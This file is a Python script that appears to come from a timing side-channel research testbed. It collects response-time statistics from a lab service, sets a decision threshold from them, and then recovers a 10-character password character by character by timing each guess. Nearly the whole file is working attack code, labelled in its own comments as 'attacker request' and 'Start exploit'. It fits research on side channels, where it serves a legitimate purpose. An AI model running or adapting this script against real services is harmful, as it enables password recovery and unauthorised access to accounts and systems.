# MIT License
#
# Copyright (c) 2017 Apogee Research
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


import socket
import time
import os
import pickle
import sys
import json
import matplotlib

matplotlib.use('Agg')
import matplotlib.pyplot as plt
import numpy as np
import operator
import decimal


def establish_data():
    data_host = 'masterNuc'
    data_port = 9090
    try:
        s_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_.connect((data_host, data_port))
        return s_
    except:
        print("Error: Data Establish")
        sys.exit(-1)


def send_cmd(c_, message):
    to_send = message + "\r"
    c_.sendall(to_send.encode())


def receive_cmd(c_):
    msg_char = ""
    message = ""
    while msg_char != "\r":
        msg_char = c_.recv(1).decode()
        message += msg_char
    return message.strip()


def close_cmd(c_):
    c_.close()


def send_request(remote_host, remote_port, request):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remote_host, remote_port))
        to_send = request + '\n'
        a = time.time()
        s.sendall(to_send.encode())
        response = s.recv(1024).decode().strip()
        response2 = ""
        b = time.time()
        if response == "ERROR":
            response2 = s.recv(1024).decode().strip()
        s.close()
        return {"request": request, "response": response, "runtime": b - a}
    except:
        return "Sample Error"


def single_sample(s_data_, remote_host, remote_port, sample, request, display=True):
    # Inform data host to start
    send_data_command_1 = {"DATA_Command": "Start", "REMOTE_PORT": remote_port, "Sample": sample}
    send_cmd(s_data_, json.dumps(send_data_command_1))
    data_msg_in_1 = receive_cmd(s_data_)
    data_in_1 = json.loads(data_msg_in_1)
    assert (data_in_1["DATA_Status"] == "Started")
    if display:
        print("\tA", "Starting")
        print("\t\tSending Request Processing Response")
        sys.stdout.flush()

    # Send attacker request
    attacker_request = request
    attacker_response = send_request(remote_host, remote_port, attacker_request)

    # Inform data host to stop
    send_data_command_2 = {"DATA_Command": "Stop", "Sample": sample}
    send_cmd(s_data_, json.dumps(send_data_command_2))
    data_msg_in_2 = receive_cmd(s_data_)

    # Processed timing host response/data
    data_in_2 = json.loads(data_msg_in_2)
    assert (data_in_2["DATA_Status"] == "Stopped")

    # Check for sample error (attacker and or benign) on timer and client
    if "Sample Error" not in [attacker_response,
                              data_in_2["Sample_Status"]]:
        return {"Response": attacker_response["response"], "Data": data_in_2["Data"]}
    else:
        return "Error"


def collect_data(remote_host, remote_port, samples, s_data_):
    data_list = {1: [], 2: []}

    # Start sampling
    for sample in range(1, samples + 1, 1):
        print("Sample:", sample, "of", samples)
        sys.stdout.flush()

        request_1 = "a"
        request_2 = "z"
        result_1 = single_sample(s_data_, remote_host, remote_port, sample, request_1)
        result_2 = single_sample(s_data_, remote_host, remote_port, sample, request_2)

        if "Error" in [result_1, result_2]:
            print("\t\tError Sample:", sample)
            sys.stdout.flush()
        else:
            data_list[1].append(result_1["Data"])
            data_list[2].append(result_2["Data"])

        print("\tB", "Stopping")
        print("\t\tProceeding to Next")
        sys.stdout.flush()

    print("Complete")
    sys.stdout.flush()
    return data_list


# Calculate the threshold value for char n
def calc_threshold(n, delta, sigma, attack_input):
    if n == 1:
        u1 = attack_input["u_1"]
        s1 = attack_input["s_1"]
    else:
        u1 = (n - 1) * delta
        s1 = ((n - 1) * (sigma ** 2)).sqrt()
    u2 = n * delta
    s2 = (n * (sigma ** 2)).sqrt()
    return decimal.Decimal(0.8) * (min(u1, u2) + ((max(u1, u2) - min(u1, u2)) / 2))


def launch_attack(remote_host, remote_port, attack_input, s_data_):
    alphabet = list("abcdefghijklmnopqrstuvwxyz")
    delta = attack_input["u_2"]
    sigma = attack_input["s_2"]
    max_ops = 300
    operations = 0
    guess = ""
    M = 10
    sample_history = {}

    def proceed(m_operations):
        if m_operations > max_ops:
            print("Exceeded Operational Budget")
            return False
        return True

    # Start exploit
    while proceed(operations):
        print("Guess:", guess)
        sample = 1
        sys.stdout.flush()

        # Current guess chars
        n = len(guess) + 1

        # Intersection t_n and t_n-1
        th_n = calc_threshold(n, delta, sigma, attack_input)
        print("\tTh:", th_n)

        # Sample chars in alphabet
        chosen_chars = []

        for char in alphabet:
            operations += 1

            # Send sample
            request = guess + char
            result = single_sample(s_data_, remote_host, remote_port, sample, request, False)
            if result == "Error":
                break
            response = result["Response"]
            response_time = result["Data"]
            print("\tOps:", operations, "Req:", request, "Resp:", response, "t:", response_time)

            # If we are on the last character
            if n == M:
                # If we guess correct then exit loop
                if response == "Correct":
                    chosen_chars.append((char, response_time))
                    break
            else:
                # Track previous samples
                if request in sample_history:
                    sample_history[request].append(response_time)
                else:
                    sample_history[request] = [response_time]

                # User previous history
                mean_time = np.mean(sample_history[request])

                # If threshold is exceeded the exit loop
                if mean_time >= th_n:
                    chosen_chars.append((char, mean_time))
            if operations >= max_ops:
                break

        # Check if any chars were chosen
        if len(chosen_chars) > 0:
            chosen_chars.sort(key=operator.itemgetter(1), reverse=True)
            chosen_char = chosen_chars[0][0]
            guess = guess + chosen_char
            # We have the password and are done
            if n == M:
                break
        # No chars were chosen so back up
        else:
            # Back up 1 char and try again
            if len(guess) > 0:
                guess = guess[:-1]

    print("Complete")
    sys.stdout.flush()
    return {"Num Ops": operations, "Password": guess}


def setup_data():
    # Establish data
    s_data_ = establish_data()
    return s_data_


def terminate_data(s_data_):
    # Inform data server complete
    send_data_command_3 = {"DATA_Command": "Complete"}
    send_cmd(s_data_, json.dumps(send_data_command_3))
    data_msg_in_3 = receive_cmd(s_data_)
    data_in_3 = json.loads(data_msg_in_3)
    assert (data_in_3["DATA_Status"] == "Complete")
    close_cmd(s_data_)


def process_results(data_filename, figname, display=False):
    # Read Data
    os.chdir("Data Input")
    data_list = pickle.load(open(data_filename + ".p", "rb"))
    os.chdir("..")

    set_1 = data_list[1]
    set_2 = data_list[2]

    mean_1 = decimal.Decimal(np.mean(set_1))
    std_1 = decimal.Decimal(np.std(set_1))
    mean_2 = decimal.Decimal(np.mean(set_2))
    std_2 = decimal.Decimal(np.std(set_2))

    plot_data(data_list, figname, display)
    return {"u_1": mean_1, "s_1": std_1,
            "u_2": mean_2, "s_2": std_2}


def plot_data(data_list, figname, display):
    def get_bins(data, a, b, n):
        # Get plot data
        bins = np.arange(a, b + (b - a) / n, (b - a) / n)
        H = plt.hist(data, bins=bins)
        plt.close()
        x = H[1][:-1]
        y = H[0]

        return [x, y]

    a = 0
    b = 5
    n = 20
    max_y = 50
    fs = 12

    set_1 = data_list[1]
    set_2 = data_list[2]
    mean_1 = np.mean(set_1)
    mean_2 = np.mean(set_2)

    set_1_H = get_bins(set_1, a, b, n)
    set_2_H = get_bins(set_2, a, b, n)

    fig = plt.figure()
    plt.plot(set_1_H[0], set_1_H[1], color="b")
    plt.plot(set_2_H[0], set_2_H[1], color="r")
    plt.plot([mean_1, mean_1], [0, max_y], "--", color="black")
    plt.plot([mean_2, mean_2], [0, max_y], "--", color="black")
    plt.xlabel("Response Time (ms)", fontsize=fs)
    plt.ylabel("Number of Samples", fontsize=fs)
    plt.ylim([0, max_y])
    plt.xlim([a, b])
    plt.xticks(fontsize=fs)
    plt.yticks(fontsize=fs)
    plt.grid()

    os.chdir("Figures")
    fig.savefig(figname + ".png", bbox_inches='tight', format='png', dpi=1200)
    os.chdir("..")

    if display:
        plt.show()
    plt.close()


def save_results(filename, results_data):
    os.chdir("Data Input")
    with open(filename + ".p", "wb") as out_file:
        pickle.dump(results_data, out_file)
    os.chdir("..")


def main():
    # Set decimal precision
    decimal.getcontext().prec = 20
    remote_host = 'serverNuc'
    remote_port = 8000
    data_filename = "Category 6 V"
    figname = "Category 6 V"

    print("Starting Sampling Host:", remote_host, ":", remote_port)
    sys.stdout.flush()
    samples = 25
    s_data_ = setup_data()
    results = collect_data(remote_host, remote_port, samples, s_data_)
    save_results(data_filename, results)
    process_output = process_results(data_filename, figname)
    print("Decision Threshold:", process_output)
    attack_output = launch_attack(remote_host, remote_port, process_output, s_data_)
    print("Result:", attack_output)
    terminate_data(s_data_)


if __name__ == "__main__":
    main()
